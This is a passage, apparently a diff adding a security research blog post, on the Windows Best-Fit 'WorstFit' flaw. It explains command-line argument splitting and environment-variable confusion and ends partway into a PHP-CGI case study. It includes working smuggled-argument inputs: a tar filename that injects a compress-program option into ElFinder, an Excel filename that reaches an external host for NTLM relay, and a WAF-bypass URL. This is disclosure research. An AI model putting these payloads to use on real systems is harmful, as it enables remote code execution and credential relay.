+&lt;p&gt;Firstly, on Windows, the &lt;strong&gt;entire command line&lt;/strong&gt; is passed as a single string to the spawned process, leaving it up to the executable to parse. That’s why the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw&quot;&gt;CreateProcess API&lt;/a&gt; accepts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpCommandLine&lt;/code&gt; patameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out &lt;a href=&quot;https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN&quot;&gt;this article&lt;/a&gt; by David Deley.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Secondly, because the command line string is stored internally in wide character (Unicode) format, retrieving its ANSI string version involves Windows using the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;&lt;/a&gt; API.  Which of course the Best-Fit feature is applied during this process, potentially altering the command line in subtle but impactful ways.&lt;/p&gt;
+
+&lt;p&gt;But actually, there isn’t a single “standard” way to parse the command line on Windows. However, the parsing convention typically adheres to the rules of &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLineToArgvW&lt;/code&gt;&lt;/a&gt; or &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/cpp/main-function-command-line-args#parsing-c-command-line-arguments&quot;&gt;CRT command-line parsing&lt;/a&gt;. In practice, most developers use either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLineToArgvW&lt;/code&gt; or CRT standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main(...)&lt;/code&gt; to handle command-line arguments, so I’d say we can pretty much treat this as the standard. The key characters involved in the parsing process include:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Tabs (0x09) and spaces (0x20)&lt;/strong&gt;: Used to separate arguments (except when in quote mode).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; (0x22)&lt;/strong&gt;: Toggles the quote mode to treat spaces as part of the argument.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; (0x5C)&lt;/strong&gt;: Escapes double quotes and backslashes when used in a specific sequence.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;These conventions form the foundation of how arguments are interpreted and passed to executables.&lt;/p&gt;
+
+&lt;p&gt;Therefore, standard libraries and functions in most programming languages adhere to these parsing rules to sanitize user-provided arguments.  For instance, in &lt;strong&gt;PHP&lt;/strong&gt;, the &lt;a href=&quot;https://www.php.net/manual/en/function.escapeshellarg.php&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt;&lt;/a&gt; function replaces double quotes with spaces, wraps the argument in quotes, and escapes backslashes as needed to ensure safe execution in the shell.  Similarly, in &lt;strong&gt;Python&lt;/strong&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module internally uses the &lt;a href=&quot;https://github.com/python/cpython/blob/v3.12.8/Lib/subprocess.py#L576&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list2cmdline&lt;/code&gt;&lt;/a&gt; function to convert a Python list into a command line string, escaping arguments strictly according to the Microsoft CRT command-line parsing logic.&lt;/p&gt;
+
+&lt;p&gt;However, all of this escaping happens before the Best-Fit feature comes into play. This means that even carefully escaped arguments can still be altered during the ANSI conversion process.&lt;/p&gt;
+
+&lt;p&gt;Here’s a simple example. Using the example Python code we provided, let’s examine what happens when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget.exe&lt;/code&gt; is spawned with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module. The entire argument parsing process would look something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we saw, fullwidth quotation marks (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) are transformed into regular double quotes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+0022&lt;/code&gt;) during the Best-Fit conversion process. This subtle alteration changes the original command-line syntax, enabling argument-splitting behavior.&lt;/p&gt;
+
+&lt;p&gt;Furthermore, even programs that don’t directly use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt; can still be vulnerable to this attack if they rely on the non-Unicode version of the main function. Yes, we’re talking about the &lt;strong&gt;innocent-looking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt;&lt;/strong&gt;!&lt;/p&gt;
+
+&lt;p&gt;Here we can do a small experiment. Given this piece of code&lt;/p&gt;
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv[%d] = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, when we run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.\test.exe &quot;foo＂ ＂bar&quot;&lt;/code&gt;, it does produce two arguments, as shown below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And yes, Python’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module can’t prevent this. Even if the entire string is passed as a single list element, it still ends up being parsed into two separate arguments.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The reason a normal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function becomes vulnerable lies in how the &lt;strong&gt;C runtime (CRT)&lt;/strong&gt; handles command-line arguments.  Even if you don’t explicitly call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;, once you use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt; function, the compiler secretly generates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup&lt;/code&gt; function inside your binary for you. This startup function is linked to the C runtime library (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ucrtbase.dll&lt;/code&gt;), which internally retrieves the command line using an ANSI API and parses it for you. And that’s where the vulnerability creeps in.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is why so many executables are exposed to WorstFit vulnerabilities. Worse still, as the attack exploits behavior at the system level during the conversion process, &lt;strong&gt;no standard library in any programming language can fully stop our attack!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;However, only on 125x and 874 code pages does the fullwidth quotation mark (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) get converted into a normal double quote. So, what about CJK (Chinese, Japanese and Korean) languages? Are they safe now? Not entirely. Double quote is NOT the only character we can use for this attack!&lt;/p&gt;
+
+&lt;p&gt;As mentioned in the &lt;strong&gt;Filename Smuggling&lt;/strong&gt; section, the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) on the Japanese (932) code page and the Won sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+20A9&lt;/code&gt;) on the Korean (949) code page are both converted into a &lt;strong&gt;backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;)&lt;/strong&gt;. And what can a backslash do? Quite a lot! As we’ve discussed, the backslash is crucial for escaping characters and altering the syntax of a command line. This means it can be exploited to manipulate command execution.&lt;/p&gt;
+
+&lt;p&gt;Let’s take this Python code as an example:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;vuln.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;foo¥&quot; bar&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Here, Python handles escaping for us – in this case, escaping the double quote. After escaping, the command line should look like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln.exe &quot;foo¥\&quot; bar&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Python prepends a backslash before the double quote to escape it. Everything seems fine, so Python passes this command line to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateProcessW&lt;/code&gt; API, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; spawns successfully. Great!&lt;/p&gt;
+
+&lt;p&gt;However, here’s where it gets tricky. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; program uses an &lt;strong&gt;ANSI API&lt;/strong&gt; to retrieve the command line. Thanks to the Best-Fit feature (again 😜), the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt;) is converted into a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;). Now, the command line seen by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; becomes:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln.exe &quot;foo\\&quot; bar&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The backslash added by Python is now escaped by the “ex-Yen-sign”. As a result, that double quote is no longer properly escaped, allowing it to act as a delimiter. The arguments for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; are now split into two parts: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo\&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note&lt;/strong&gt;: Of course, characters that can be converted into spaces or tabs can also be exploited for argument splitting. I’ll leave this part as an exercise for you 😉.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, we already explored most of the possible ways to exploit WorstFit for argument splitting. Let’s dive into some real-world exploits and see this attack in action!&lt;/p&gt;
+
+&lt;h4 id=&quot;-case-study-1---elfinder-rce-w-windows-built-in-gnu-tar&quot;&gt;➤ Case Study 1 - ElFinder: RCE w/ Windows built-in GNU Tar&lt;/h4&gt;
+
+&lt;p&gt;Here, one of our case studies highlights an RCE (Remote Code Execution) attack on &lt;a href=&quot;https://github.com/Studio-42/elFinder&quot;&gt;&lt;strong&gt;ElFinder&lt;/strong&gt;&lt;/a&gt;, caused by the WorstFit vulnerability in Windows’ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;ElFinder is a popular open-source, web-based file manager with a PHP backend. By default, it supports Windows servers and comes with a built-in feature for creating and extracting archives, which is also enabled by default.&lt;/p&gt;
+
+&lt;p&gt;The way it handles archive formats is straightforward—it directly executes shell commands.  Sounds risky? Perhaps. But the developers have taken precautions by escaping all arguments properly using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt; (&lt;a href=&quot;https://github.com/Studio-42/elFinder/blob/7544918a2ba656a4fe72a6fc8bb502d39f601cda/php/elFinderVolumeDriver.class.php#L6898-L6911&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php/elFinderVolumeDriver.class.php#L6898-L6911&lt;/code&gt;&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Despite this effort, escaping at the application level might not fully mitigate risks if quirks like the Best-Fit feature in Windows are involved.&lt;/p&gt;
+
+&lt;p&gt;One of the archive formats supported by ElFinder is the &lt;strong&gt;tar&lt;/strong&gt; format. It uses the system’s built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command to create or extract archives. For example, if we create an archive named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foobar.tar&lt;/code&gt; containing the files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar.txt&lt;/code&gt;, ElFinder would just execute the following command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe -chf &quot;foobar.tar&quot; &quot;.\foo.txt&quot; &quot;.\bar.txt&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;However, we discovered that the Windows built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command is vulnerable to the &lt;strong&gt;WorstFit&lt;/strong&gt; attack! This means that if you can control even a small part of an argument, it’s possible to execute arbitrary commands. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/tar/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;To exploit this, we can simply name the tar file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa＂ ＂--use-compress-program=calc＂ ＂bbb.tar&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;). This injects the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--use-compress-program&lt;/code&gt; parameter, which allows arbitrary command execution. In our demonstration, this results in popping up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt;.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;In this demonstration, we use an English-configured Windows server (Code Page 1252) as an example. This technique should also work on other 125x code pages and Code Page 874 configurations.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;-case-study-2---all-the-ways-to-code-execution&quot;&gt;➤ Case Study 2+ - All the Ways to Code Execution&lt;/h4&gt;
+
+&lt;p&gt;Of course, there are more applications are indirectly exposed to WorstFit vulnerabilities because they invoke other executables that are themselves vulnerable to this. Here we demonstrate two examples:&lt;/p&gt;
+
+&lt;p&gt;The first one involves a modified version of plink.exe used in &lt;strong&gt;TortoiseGit&lt;/strong&gt;. When a user enters a malicious URI for cloning, it can trigger code execution. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/plink/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;The second example involves &lt;strong&gt;RStudio&lt;/strong&gt;, which supports version control with SVN. If an SVN project is placed in a maliciously crafted folder, a single click can trigger a calculator to pop up on the user’s machine! For more details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/SVN/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h4 id=&quot;-case-study-3---microsoft-excel-remote-code-execution-cve-2024-49026&quot;&gt;➤ Case Study 3 - Microsoft Excel Remote Code Execution &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;While re-mounting Argument Injection to applications, we discovered that the Argument Splitting attack can be combined with the “Open-With” feature to escalate its impact!&lt;/p&gt;
+
+&lt;p&gt;Windows actually maintains a handler table to know which program to use to open a file when you double-click a file. You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftype&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;assoc&lt;/code&gt; to see which programs handle specific file extensions. The filename would also become part of the argument, which means we can apply our attack through that!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We then discovered that the executable of Microsoft Excel is vulnerable to the Argument Splitting attack. We can just rename the Excel file to the following name - translating all dots, (back-)slashes, and double quote to their fullwidth forms.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;．．／．．／．．／Windows／win.ini＂ ／n ＂＼＼malicious.tld@80＼pwn.xlsx&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;By combining two tricks, we can trigger an Argument Injection on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Excel.exe&lt;/code&gt; with just 1-Clik. Since Excel itself &lt;a href=&quot;https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel&quot;&gt;doesn’t have any good argument&lt;/a&gt; for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;&lt;em&gt;P.S. if you find a better argument that can directly lead to RCE, please let us know!&lt;/em&gt; 🙂&lt;/p&gt;
+
+&lt;h3 id=&quot;-environment-variable-confusion&quot;&gt;🔥 Environment Variable Confusion&lt;/h3&gt;
+
+&lt;p&gt;When functions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentStringsA&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *getenv(const char *varname)&lt;/code&gt; are used, they return the &lt;strong&gt;Best-Fit&lt;/strong&gt; version of the environment variable. This subtle behavior can be exploited to bypass character restrictions, creating potential opportunities for attackers to slip through otherwise secure validations and introduce security vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *getenv(const char *varname)&lt;/code&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: No specific&lt;br /&gt;
+&lt;strong&gt;Threat Characters&lt;/strong&gt;: No specific (for Apache HTTPd: 0x00-0xFF)&lt;/p&gt;
+
+&lt;p&gt;For this exploit scenario, the environment variables must be user-controllable, which often occurs when a parent process needs to pass information to a spawned process.&lt;/p&gt;
+
+&lt;p&gt;A common example is in &lt;strong&gt;CGI (Common Gateway Interface)&lt;/strong&gt;, where much of the HTTP request information—such as query strings, HTTP headers, and more—is passed through environment variables. This creates an opportunity for attackers to manipulate these variables and exploit the behavior. Here, we present two case studies as a starting point to spark your further ideas.&lt;/p&gt;
+
+&lt;h4 id=&quot;-case-study-1---waf-bypass&quot;&gt;➤ Case study 1 - WAF bypass&lt;/h4&gt;
+
+&lt;p&gt;In some scenarios, a CGI script may act as a routing service. When this happens, the portion of the URL path after the CGI executable is stored in the environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt;. A common use case might involve a developer trying to restrict remote access to sensitive endpoints, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi.pl/admin&lt;/code&gt; from the web server, instead of the CGI itself. For example, in an Apache setup, they might add the following rule to deny access:&lt;/p&gt;
+
+&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;/var/www/cgi-bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;%{REQUEST_URI} =~ m#/admin#&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, due to the &lt;strong&gt;WorstFit vulnerability&lt;/strong&gt; in Perl on Windows, this rule can be bypassed by substituting characters in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; with their &lt;strong&gt;Best-Fit equivalents&lt;/strong&gt;. For instance, in &lt;strong&gt;Code Page 1250&lt;/strong&gt;, the character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;à&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00E0&lt;/code&gt;) is converted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; during the ANSI conversion.&lt;/p&gt;
+
+&lt;p&gt;By crafting a URL like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi.pl/%E0dmin&lt;/code&gt;, an attacker can bypass the Nginx rule, as the server interprets it as a different path, but Perl’s CGI script retrieves the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; environment variable with ANSI API, and processes it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt; after the Best-Fit conversion.&lt;/p&gt;
+
+&lt;h4 id=&quot;-case-study-2---php-cgi-local-file-inclusion-lfi&quot;&gt;➤ Case study 2 - PHP-CGI Local File Inclusion (LFI)&lt;/h4&gt;
+
+&lt;p&gt;The previous example was hypothetical, but here’s a real-world case we discovered. In &lt;strong&gt;PHP-CGI on Windows&lt;/strong&gt;, we identified a file existence check oracle and even a potential LFI (Local File Inclusion) vulnerability under certain configurations.&lt;/p&gt;
+
+&lt;p&gt;The root cause lies in how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; — and other path-related environment variables — are handled. Let’s break it down:&lt;/p&gt;
+
+&lt;p&gt;Imagine a request URI like this:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://victim.tld/index.php/foo/bar&lt;/code&gt;&lt;/p&gt;
+
